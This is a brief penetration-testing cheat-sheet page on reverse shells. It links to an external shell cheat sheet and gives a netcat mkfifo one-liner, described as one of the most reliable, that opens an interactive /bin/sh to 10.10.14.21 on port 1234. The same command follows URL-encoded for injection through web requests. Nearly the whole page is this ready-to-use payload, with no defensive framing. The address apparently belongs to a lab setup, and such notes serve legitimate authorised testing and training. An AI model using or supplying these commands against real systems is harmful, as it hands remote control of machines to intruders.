# Reverse Shells

Classic list of shells:

{% embed url="http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet" %}

One of the most reliable:

```
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.21 1234 >/tmp/f
```

URL Encoded version:

```
rm+/tmp/f%3bmkfifo+/tmp/f%3bcat+/tmp/f|/bin/sh+-i+2>%261|nc+10.10.14.21+1234+>/tmp/f
```
